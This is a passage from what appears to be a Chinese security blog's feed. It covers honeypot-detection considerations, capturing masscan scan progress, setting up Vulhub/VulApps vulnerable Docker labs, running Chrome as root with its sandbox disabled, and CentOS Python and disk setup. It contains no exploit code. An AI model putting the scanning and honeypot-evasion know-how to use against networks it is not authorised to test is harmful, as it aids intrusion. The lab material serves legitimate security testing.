<p>所以,一台部署了蜜罐的设备,可能不仅仅是保护自身，对于同网段的机子来说也有一定的益处.</p>
<h2 id="大量脏数据入库">大量脏数据入库:</h2>
<p>如果检测的时候,没有恰当的处理,很有可能会造成大量的脏数据入库.</p>
<hr />
<h1>简单的解决方案:</h1>
<p>识别端口的开放情况和服务,这两个功能一定要分开.</p>
<blockquote>
<p>可见开发时的设计要遵从 <strong>高内聚、低耦合原则</strong>.</p>
</blockquote>
<p>如果识别一个主机开放了过多的端口(如超过100个),那么可以选择</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>跳过这个主机.</p>
</li>
<li class="lvl-2">
<p>仅识别top 100</p>
</li>
</ul>
<hr />
<h1>疑问:</h1>
<p>某个主机或某个网段内部署了蜜罐,会不会有点 <strong>此地无银三百两</strong>的意味呢?</p>
<p>或许发现、识别蜜罐的同时,也侧面说明了这个网段内有企业重要的资产?!</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="http://phantom0301.cc/2016/03/23/Antihoneypot/">反蜜罐技术学习</a></p>
</li>
<li class="lvl-2">
<p><a href="https://cloud.tencent.com/developer/article/1047554">浅谈简易端口扫描威胁感知系统的设计与实现</a></p>
</li>
<li class="lvl-2">
<p><a href="https://sosly.me/index.php/2017/09/05/jymiguan2/">蜜罐与内网安全从0到1（二）</a></p>
</li>
<li class="lvl-2">
<p>DC0531技术沙龙-国内SRC漏洞挖掘经验和技巧分享</p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>获取masscan的扫描进度</title>
    <url>/2019/4287.html</url>
    <content><![CDATA[<h1>Preface:</h1>
<p>一开始打算通过<code>subprocess</code>模块来调用<code>masscan</code>,然后获取它输出的进度。</p>
<p>但是发现它的进度输出是覆盖刷新输出的。</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d74ccaa35.jpg" alt="" /></p>
<p>这个时候，<code>subprocess</code>就无法获得它的输出了。</p>
<p>想了下,<code>masscan</code>这个刷新输出应该是优化过的结果,避免打印出太多重复无效的信息。</p>
<p>这个时候,我们只要修改一下它的输出就可以达到效果.</p>
<hr />
<h1>修改源码:</h1>
<p>搜索了一下,参考:<a href="https://blog.csdn.net/zhanghuoding/article/details/52041120">C语言实现在控制台同一行覆盖刷新输出，以及’\b’退格控制字符的使用</a></p>
<p>知道<code>printf(&quot;\r&quot;); </code>是可以做到刷新输出的效果的。</p>
<p>搜索关键字:<code>rate:</code></p>
<p>定位到<code>main-status.c</code>这个文件</p>
<p>修改这一行.将覆盖刷新输出改成 换行输出。<br />
<img src="https://i.loli.net/2019/04/25/5cc1d74dc815b.jpg" alt="" /></p>
<p>重新编译运行.</p>
<p>可以看到效果:</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d74f398a5.jpg" alt="" /></p>
<hr />
<h2 id="获取进度百分比">获取进度百分比:</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getPercentageNum</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    正则匹配百分比数字</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    re_pattern = <span class="string">r&quot;(\d&#123;1,2&#125;.\d&#123;1,2&#125;)\%&quot;</span></span><br><span class="line">    num_match_list = re.findall(re_pattern, content)</span><br><span class="line">    <span class="keyword">if</span> num_match_list:</span><br><span class="line">        <span class="keyword">return</span> num_match_list[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd = shlex.split(shell_cmd)</span><br><span class="line"><span class="built_in">print</span> cmd</span><br><span class="line">        </span><br><span class="line">p = subprocess.Popen(cmd, shell=<span class="literal">False</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line"><span class="keyword">while</span> p.poll() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    line = p.stdout.readline()</span><br><span class="line">    line = line.strip()</span><br><span class="line">    <span class="keyword">if</span> line:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;percentage: [&#123;&#125;]&#x27;</span>.<span class="built_in">format</span>(line))</span><br><span class="line">        <span class="built_in">print</span> getPercentageNum(line)</span><br></pre></td></tr></table></figure>
<p>通过上面两个函数,就可以获取到 扫描的进度百分比了.</p>
<h1>另一种思路:</h1>
<p>开启一个msscan,按下回车键的时候,会再次输出进度。</p>
<p>或许可以与进程通信,然后发送信号,来获取进度信息。</p>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Centos7 Docker部署漏洞环境</title>
    <url>/2019/54517.html</url>
    <content><![CDATA[<h1>docker安装:</h1>
<ul class="lvl-0">
<li class="lvl-2">查询可用版本</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># yum list docker-ce --showduplicates | sort -r</span></span><br><span class="line">已加载插件：fastestmirror, langpacks</span><br><span class="line">可安装的软件包</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line">docker-ce.x86_64            3:18.09.2-3.el7                     docker-ce-stable</span><br><span class="line">docker-ce.x86_64            3:18.09.1-3.el7                     docker-ce-stable</span><br><span class="line">docker-ce.x86_64            3:18.09.0-3.el7                     docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.06.3.ce-3.el7                    docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.06.2.ce-3.el7                    docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.06.1.ce-3.el7                    docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.06.0.ce-3.el7                    docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.03.1.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            18.03.0.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.12.1.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.12.0.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.09.1.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.09.0.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.06.2.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.06.1.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.06.0.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.03.3.ce-1.el7                    docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.03.2.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.03.1.ce-1.el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            17.03.0.ce-1.el7.centos             docker-ce-stable</span><br></pre></td></tr></table></figure>
<p>如果使用<code>yum install docker-ce </code>下载下来的docker版本是很有可能是第一个<code>3:18.09.2-3.el7</code>,运行的时候会报错,要指定<code>centos</code>的版本下载才能正常运行.</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>安装指定版本</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># yum install docker-ce-18.03.1.ce-1.el7.centos</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>启动docker</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># systemctl start docker </span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>测试安装结果</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker run hello-world                       </span></span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the <span class="string">&quot;hello-world&quot;</span> image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image <span class="built_in">which</span> runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, <span class="built_in">which</span> sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"> $ docker run -it ubuntu bash</span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https://hub.docker.com/</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https://docs.docker.com/get-started/  </span><br></pre></td></tr></table></figure>
<p>无报错,则正常</p>
<hr />
<h1>漏洞环境下载:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/vulhub/vulhub">Pre-Built Vulnerable Environments Based on Docker-Compose</a></p>
</li>
</ul>
<p>根据readme 安装</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/Medicean/VulApps">快速搭建各种漏洞环境(Various vulnerability environment</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.51cto.com/13767724/2164915?source=dra">CentOS7下安装Docker-Compose</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/xiaoxianerqq/article/details/80579113">cannot uninstall a distutils installed project’</a></p>
</li>
</ul>
<hr />
<h1>开机自启:</h1>
<h2 id="docker-服务开机自启">docker 服务开机自启</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># systemctl enable docker.service</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.</span><br></pre></td></tr></table></figure>
<h2 id="漏洞环境容器的开机自启">漏洞环境容器的开机自启</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拉取镜像到本地</span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker pull medicean/vulapps:s_struts2_s2-032 </span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动环境</span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-032</span></span><br><span class="line">6aa16caac712adcc0f5410dbed2aaa14a303ede2378311f0c2222b1901bcef25</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看CONTAINER ID </span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                            NAMES</span><br><span class="line">6aa16caac712        medicean/vulapps:s_struts2_s2-032   <span class="string">&quot;/usr/local/tomcat/b…&quot;</span>   22 seconds ago      Up 21 seconds       0.0.0.0:80-&gt;8080/tcp             keen_carson</span><br><span class="line">ee8ea1d1acdd        medicean/vulapps:r_redis_1          <span class="string">&quot;/start.sh&quot;</span>              30 minutes ago      Up 4 minutes        22/tcp, 0.0.0.0:6379-&gt;6379/tcp   redisvul</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参数always:始终重启,更新设为开机自启</span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker update --restart=always 6aa16caac712</span></span><br><span class="line">6aa16caac712</span><br></pre></td></tr></table></figure>
<p>重启机子,后允许<code>docker ps </code>查看是否自启成功</p>
<h1>其他常用命令:</h1>
<h2 id="删除容器">删除容器:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看所有container</span></span><br><span class="line">root@Linx:~/apache<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                       PORTS               NAMES</span><br><span class="line">e6318265a202        httpd:centos        <span class="string">&quot;/run.sh&quot;</span>           5 minutes ago       Exited (127) 5 minutes ago                       httpd1              </span><br><span class="line">eaf9ee72f448        httpd:centos        <span class="string">&quot;/run.sh&quot;</span>           6 minutes ago                                                        httpd     </span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &quot;docker rm 容器id&quot;来删除一个终止状态的容器；若要删除一个运行中的容器，需要加-f参数。</span></span><br><span class="line">root@Linx:~/apache<span class="comment"># docker rm e6318265a202</span></span><br><span class="line">e6318265a202</span><br></pre></td></tr></table></figure>
<h2 id="删除镜像">删除镜像:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看已有的docker镜像</span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              latest              47b19964fb50        3 weeks ago         88.1MB</span><br><span class="line">hello-world         latest              fce289e99eb9        8 weeks ago         1.84kB</span><br><span class="line">centos              latest              1e1148e4cc2c        2 months ago        202MB</span><br><span class="line">medicean/vulapps    s_struts2_s2-048    14cac47d977d        19 months ago       348MB</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除images，通过image的id来指定删除谁</span></span><br><span class="line">docker rmi &lt;image <span class="built_in">id</span>&gt;</span><br></pre></td></tr></table></figure>
<hr />
<h1>others:</h1>
<p>这样就可以使用一台机子来专门安装漏洞环境,方便poc测试、调试。</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/vulhub/vulhub">Pre-Built Vulnerable Environments Based on Docker-Compose</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/Medicean/VulApps">快速搭建各种漏洞环境(Various vulnerability environment</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Centos7下root运行Chrome</title>
    <url>/2019/12733.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>在Centos7下安装好Chrome浏览器后,root直接运行Chrome的话,会有提示说</p>
<p><code>Running as root without --no-sandbox is not supported</code></p>
<h1>做法</h1>
<p>修改Chrome的启动脚本即可.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /usr/bin/google-chrome</span><br></pre></td></tr></table></figure>
<p>修改前</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># processes (http://crbug.com/376567).</span><br><span class="line">exec &lt; /dev/null</span><br><span class="line">exec &gt; &gt;(exec cat)</span><br><span class="line">exec 2&gt; &gt;(exec cat &gt;&amp;2)</span><br><span class="line"></span><br><span class="line"># Note: exec -a below is a bashism.</span><br><span class="line">exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot;</span><br></pre></td></tr></table></figure>
<p>修改后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># processes (http://crbug.com/376567).</span><br><span class="line">exec &lt; /dev/null</span><br><span class="line">exec &gt; &gt;(exec cat)</span><br><span class="line">exec 2&gt; &gt;(exec cat &gt;&amp;2)</span><br><span class="line"></span><br><span class="line"># Note: exec -a below is a bashism.</span><br><span class="line">exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot; --no-sandbox --user-data-dir</span><br></pre></td></tr></table></figure>
<p>这个时候就可以用chrome</p>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.itzgeek.com/how-tos/linux/centos-how-tos/how-to-run-google-chrome-as-root-centos-7-rhel-7.html">How to run Google Chrome as root on CentOS 7 / RHEL 7</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Centos7安装py环境</title>
    <url>/2019/34580.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>环境: Centos7 64位</p>
<hr />
<h1>安装py3:</h1>
<p>py3版本:<code>3.6.3</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 准备编译环境</span></span><br><span class="line">yum install zlib-devel bzip2-devel openssl-devel ncurses-devel -y</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装编译所需依赖</span></span><br><span class="line">yum install gcc-c++ gcc -y</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载 Python3.6代码包</span></span><br><span class="line">wget https://www.python.org/ftp/python/3.6.3/Python-3.6.3.tar.xz</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar xf Python-3.6.3.tar.xz -C /usr/local/src/</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译安装</span></span><br><span class="line"><span class="built_in">cd</span> /usr/local/src/Python-3.6.3/</span><br><span class="line">./configure --prefix=/usr/local/python3</span><br><span class="line">make -j 4 &amp;&amp; make install</span><br></pre></td></tr></table></figure>
<p>安装成功后提示</p>
<p><img src="https://i.loli.net/2019/05/23/5ce5ff3a7ce4393926.png" alt="" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 做软链：</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3/bin/python3.6 /usr/local/bin/python3</span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3/bin/python3.6 /usr/bin/python3    </span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3/bin/pip3 /usr/bin/pip3</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 升级pip到最新版本：</span></span><br><span class="line">pip3 install --upgrade pip</span><br></pre></td></tr></table></figure>
<p>搞定.</p>
<hr />
<h1>同时再安装py3.9:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载 Python3.9源码包</span></span><br><span class="line">wget https://www.python.org/ftp/python/3.9.5/Python-3.9.5.tgz</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar xf Python-3.9.5.tgz -C /usr/local/src/</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译安装</span></span><br><span class="line"><span class="built_in">cd</span> /usr/local/src/Python-3.9.5/</span><br><span class="line">./configure --prefix=/usr/local/python3.9</span><br><span class="line">make -j 4 &amp;&amp; make install</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 做软链：</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3.9/bin/python3 /usr/local/bin/python3.9</span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3.9/bin/python3 /usr/bin/python3.9  </span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3.9/bin/pip3 /usr/bin/pip3.9</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 升级pip到最新版本：</span></span><br><span class="line">pip3.9 install --upgrade pip</span><br></pre></td></tr></table></figure>
<p>注意路径，然后不要把原来的另一个python3版本的覆盖了就好。</p>
<hr />
<h1>安装py2:</h1>
<p>py2版本:<code>2.7.13</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 准备编译环境</span></span><br><span class="line">yum groupinstall <span class="string">&quot;Development tools&quot;</span></span><br><span class="line">yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载&amp;解压</span></span><br><span class="line">wget https://www.python.org/ftp/python/2.7.13/Python-2.7.13.tgz</span><br><span class="line">tar -zxvf Python-2.7.13.tgz</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line"><span class="built_in">cd</span> Python-2.7.13</span><br><span class="line">./configure --prefix=/usr/local</span><br><span class="line">make</span><br><span class="line">make altinstall</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份原有系统默认的py</span></span><br><span class="line"><span class="built_in">mv</span> /usr/bin/python /usr/bin/python.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 软链接:</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/bin/python2.7 /usr/bin/python</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/05/23/5ce61595de84126805.png" alt="" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装pip</span></span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line">python get-pip.py  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 软链接:</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/bin/pip2.7 /usr/bin/pip</span><br></pre></td></tr></table></figure>
<p>修改yum配置:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改yum文件头部,要指向系统默认的Python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看/usr/bin/目录下所有yum文件头部</span></span><br><span class="line">ll /usr/bin/yum*　　</span><br><span class="line"><span class="comment"># 修改/usr/bin/目录下所有yum文件头部,一般就修改/usr/bin/yum这个</span></span><br><span class="line">vi /usr/bin/yum*　　</span><br><span class="line"><span class="comment">#!/usr/bin/python 修改成: #!/usr/bin/python2.7　　</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改urlgrabber-ext-down头部</span></span><br><span class="line">vi /usr/libexec/urlgrabber-ext-down　　</span><br><span class="line"><span class="comment">#!/usr/bin/python 修改成 #!/usr/bin/python2.7</span></span><br></pre></td></tr></table></figure>
<hr />
<h1>包的迁移:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导出</span></span><br><span class="line">pip2 freeze &gt; py2requirements.txt</span><br><span class="line">pip3 freeze &gt; py3requirements.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"><span class="comment"># 加aliyun代理</span></span><br><span class="line">pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意:pip会顺序从列表上安装下来,遇到某个有问题的包后,会退出.后面的包不会被安装到.</p>
</blockquote>
<p>一些无法或很难安装的包,可以尝试通过复制来迁移</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到第三包的安装路径</span></span><br><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> sys.path</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python27.zip&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7/plat-linux2&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7/lib-tk&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7/lib-old&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7/lib-dynload&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7/site-packages&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h1>pip其他使用场景:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip批量安装跳过无法安装的包继续运行</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> requirement; <span class="keyword">do</span> sudo pip3 install <span class="variable">$requirement</span>; <span class="keyword">done</span> &lt; requirement.txt</span><br><span class="line"><span class="comment"># example:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> requirement; <span class="keyword">do</span> sudo pip2 install <span class="variable">$requirement</span> -i https://mirrors.aliyun.com/pypi/simple/ --trusted-host mir</span><br><span class="line">rors.aliyun.com; <span class="keyword">done</span> &lt; py2requirements.log</span><br></pre></td></tr></table></figure>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/chillax1314/p/7976839.html">CentOS6.8安装Python3.6.3</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/renhanchi/article/details/73496317">【Python】CentOS 6.9 安装Python２.7.13和pip</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/lvjianxun/articles/7530915.html">CentOS7保留默认python版本并安装更新python2和python3两个最新版本（python2和python3共存）</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Centos7系统安装</title>
    <url>/2019/64204.html</url>
    <content><![CDATA[<h1>系统安装:</h1>
<h2 id="镜像选择">镜像选择:</h2>
<p>生产服务器如果是大内存（4G以上内存），建议安装64位版本</p>
<hr />
<h2 id="语言选择">语言选择</h2>
<p>正式生产服务器建议安装英文版本</p>
<hr />
<h3 id="实际的配置">实际的配置:</h3>
<p>虚拟机的配置</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>4个cpu</p>
</li>
<li class="lvl-2">
<p>内存为6G</p>
</li>
<li class="lvl-2">
<p>硬盘为200G(精简置备模式)</p>
</li>
</ul>
<hr />
<h2 id="自定义硬盘分区">自定义硬盘分区</h2>
<p>这个比较重要</p>
<hr />
<h3 id="必要的分区">必要的分区:</h3>
<p><strong>boot分区</strong>:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>作用：<strong>引导分区</strong>，包含了系统启动的必要内核文件，即使根分区顺坏也能正常引导启动 一般这些文件所占空间在200M以下，</p>
</li>
<li class="lvl-2">
<p>分区建议：分区的时候可选100M-500M之间,如果空间足够用，建议分300-500M。避免由于长期使用的冗余文件塞满这个分区。</p>
</li>
</ul>
<p><strong>/分区(根分区):</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>作用：所有的文件都从这里开始，你可以比喻为Windows的C盘，但其实有区别。如果你有大量的数据在根目录下（比如FTP等）可以划分大一点的空间</p>
</li>
<li class="lvl-2">
<p>分区建议：建议15G以上。看需求，根分区和home分区的大小就类似C盘和D盘的空间分布一样，主要占空间在哪儿就在那里分大容量</p>
</li>
</ul>
<p><strong>swap分区：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>作用：<strong>类似于Windows的虚拟内存</strong>，在内存不够用时占用硬盘的虚拟内存来进行临时数据的存放，而对于linux就是swap分区</p>
</li>
<li class="lvl-2">
<p>分区建议：建议是物理内存大小的2倍，比如你电脑是4G的物理内存，swap分区可以是8G</p>
</li>
</ul>
<blockquote>
<p>朋友的建议:一般的场景就是 内存不到8G 给内存x1.5 或者 2 倍,到8G或以上 给 8-16g就行.</p>
</blockquote>
<hr />
<h3 id="硬盘分区">硬盘分区:</h3>
<p>自定义的硬盘分区:</p>
<p><img src="https://i.loli.net/2019/04/26/5cc2e356bd90d.jpg" alt="" /></p>
<p><s>其中<code>/根目录</code>和<code>swap目录</code>的硬盘类型选择了:<code>Thin provisioning</code>精简配置模式</s></p>
<blockquote>
<p><s>也就是实际上用了多少就分配多少空间,避免浪费空间,免得刚装完,一导出整个虚拟机就很大.</s></p>
</blockquote>
<p><s>在新建虚拟机的时候,已经选择了精简配置模式了,里面的磁盘类型选择默认的即可.</s></p>
<p>不然可能会出现io error这类错误,导致系统崩溃…</p>
<p><img src="https://i.loli.net/2019/06/27/5d143d1d983fd38594.png" alt="" /></p>
<p>之前在使用centos6的时候,很少出现io error这类错误</p>
<p>查看旧系统cento6的磁盘类型,</p>
<p><img src="https://i.loli.net/2019/07/01/5d19787ac1a6691705.png" alt="" /></p>
<p>依据这个进行配置.都是选用<code>ext4</code>,而不是默认的<code>xfs</code></p>
<p>配置完成后</p>
<p><img src="https://i.loli.net/2019/07/01/5d197bedc3d7756404.png" alt="" /></p>
<p>在之后要尽量少直接断电,要正常关机…</p>
<blockquote>
<p>经常断电硬盘早晚完蛋。</p>
</blockquote>
<hr />
<h1>虚拟机拷贝:</h1>
<ol>
<li class="lvl-3">
<p>浏览数据存储</p>
</li>
<li class="lvl-3">
<p>新建文件夹</p>
</li>
<li class="lvl-3">
<p>copy 后缀为<code>.vmx</code>和<code>.vmdk</code>的文件到 新建的文件夹里</p>
</li>
<li class="lvl-3">
<p>在新的<code>.vmx</code>文件右键:添加资源.</p>
</li>
</ol>
<hr />
<h1>初始化安装:</h1>
<ul class="lvl-0">
<li class="lvl-2">
